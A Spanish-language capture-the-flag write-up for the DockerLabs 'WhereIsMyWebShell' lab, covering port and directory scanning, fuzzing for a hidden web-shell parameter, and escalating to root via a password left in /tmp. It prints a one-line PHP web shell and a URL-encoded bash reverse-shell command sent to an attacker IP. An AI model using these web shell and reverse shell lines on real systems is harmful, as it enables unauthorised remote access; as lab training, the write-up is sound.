# Máquina WhereIsMyWebShell

---------------------

Dificultad -> Medium

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)
## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack
```

Lanzamos un conjunto de scripts predeterminado con **nmap** para que nos reporte más información relacionada al puerto 80.

```shell
nmap -sCV -p80 172.17.0.2 -oN targeted
________________________________________________
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Academia de Ingl\xC3\xA9s (Inglis Academi)
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

Vemos la versión de Apache y un título de la web. Accedemos a la web para seguir inspeccionando:

![Pasted image 20240412230806](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/6fe4e0bb-3e2d-48e8-9239-3457fdadcf10)

Encontramos esta web sobre la que no podemos interactuar en ningún aspecto.
Al final del todo encontramos una pequeña pista.

![Pasted image 20240412230913](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/1ce153dd-3323-4818-a2d4-fcd87759e3b6)

Más adelante veremos si esta información nos sirve para algo o no.

Como de costumbre, aplicamos **fuzzing** de directorios para intentar descubrir algún directorio interesante con la herramienta **gobuster**.
Indicaremos también que queremos descubrir archivos con extensión php, txt, html, php.bak. Mediante el parámetro "**-x**"

```shell
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,txt,html,php.bak
________________________________________________
/index.html           (Status: 200) [Size: 2510]
/shell.php            (Status: 500) [Size: 0]   
/warning.html         (Status: 200) [Size: 315] 
/server-status        (Status: 403) [Size: 275] 
```

Encontramos dos archivos interesantes: **warning.html** y **shell.php**

-----------
## Explotación

Inspeccionamos **warning.html**:

![Pasted image 20240412231456](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/c0266fb2-3fa6-4e35-8915-25f023b805d8)

Esto nos da una pista.
Suponemos que el otro archivo (**shell.php**), tiene una estructura similar a:

```php
<?php
	system($_GET['cmd']);
?>
```

Pero desconocemos el nombre del parámetro que se usa en **shell.php**. Es decir, el parámetro "**cmd**" para el ejemplo de arriba.

Lo que vamos a hacer es **Fuzzear** con un diccionario, para descubrir cuál es ese parámetro que nos da una respuesta.
En este caso he decidido emplear **wfuzz**.
Donde usamos 200 hilos ("-t 200") para ir muy rápido, un diccionario típico de [SecLists](https://github.com/danielmiessler/SecLists), la macro **FUZZ** que se reemplazará con las palabras de la lista especificada anteriormente. Es decir, estaremos tratando de ejecutar el comando **id** para cada parámetro posible en la url.

```shell
wfuzz -c -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://172.17.0.2/shell.php?FUZZ=id"
--------------------------------------
000000020:   500        0 L      0 W        0 Ch        "crack"                                                                                                                                  
000000001:   500        0 L      0 W        0 Ch        "# directory-list-2.3-medium.txt"                                                                                                       
000000018:   500        0 L      0 W        0 Ch        "2006"                                                                                                       
000000003:   500        0 L      0 W        0 Ch        "# Copyright 2007 James Fisher"                                                                         
000000015:   500        0 L      0 W        0 Ch        "index"                         
```

Nos está reportando todos los resultados erróneos. Como todos los parámetros que no nos funcionan devuelven 0 líneas en la respuesta, vamos a ocultar los resultados que devuelvan ese número de líneas. Esto lo podemos hacer con el parámetro **--hl=0**.

```shell
wfuzz -c --hl=0 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://172.17.0.2/shell.php?FUZZ=id"
-------------------------------------
000115401:   200        2 L      4 W        66 Ch       "parameter"     
```

Vemos que el parámetro -> "**parameter**" con el comando **id** que le hemos pasado, nos devuelve 2 líneas a diferencia del resto. Nos dirigimos a la web a comprobar que funciona y efectivamente hemos logrado un **RCE**. (Ejecución remota de comandos).
Nos dirigimos a la web y lo comprobamos:

![Pasted image 20240412233935](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/23082e2d-ccfd-42eb-b5a8-a5e82ec722bf)

Como de costumbre, nos enviamos una **Reverse shell** para ganar acceso a la máquina:

Nos ponemos en escucha por el puerto 443 con **netcat**:

```shell
nc -nlvp 443
```

(Es posible que para escuchar con netcat por el puerto 443 necesites ser el usuario root)

Y en la URL vulnerable:

```
http://172.17.0.2/shell.php?parameter=bash -c "bash -i >%26 /dev/tcp/192.168.10.150/443 0>%261"
```

Los **"%26"** corresponden al símbolo **"&"** de forma URL-encodeada para que no den conflicto. Y siendo la **192.168.10.150** la **IP** de mi máquina atacante.

Hemos ganado acceso a la máquina:

![Pasted image 20240412234748](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/6ea678df-bb8c-4ed4-b3bb-4ecca28edbb8)

---------------
### Tratamiento de la tty

Realizaremos un breve **tratamiento de la tty** para poder operar de forma cómoda sobre la consola. Los comandos a ejecutar:

```shell
script /dev/null -c bash 
```
(hacemos  **ctrl  +  Z**)

```shell
stty raw -echo; fg
reset xterm
stty rows 62 columns 248
export TERM=xterm
export SHELL=bash
```

Pondremos en rows y columns las columnas y filas que correspondan a la pantalla de nuestra máquina.
Una vez hecho esto podemos maniobrar con comodidad, pudiendo hacer Ctrl+L para limpiar la pantalla así como Ctrl+C.

------------

## Escalada de privilegios

Según la pista que nos dieron al principio de este reto, acerca del directorio **/tmp**. Comprobamos su contenido. Usamos "**ls -la**" para listar posibles ficheros o directorios ocultos.

```shell
cd /tmp
ls -la
---------------------------------
total 4
drwxrwxrwt 1 root root  22 Apr 12 23:04 .
drwxr-xr-x 1 root root 152 Apr 12 23:04 ..
-rw-r--r-- 1 root root  21 Apr 12 16:07 .secret.txt
```

Veamos que encontramos en el txt llamado **.secret.txt**

```shell
cat .secret.txt
----------------------------------
contraseñaderoot123
```

Nos otorga una contraseña para el usuario **root** directamente.

```shell
su root
```

Introducimos la contraseña -> **contraseñaderoot123**

```shell
whoami
----------------------------------
root
```

¡ Hemos logrado el nivel de privilegios máximo sobre la máquina !

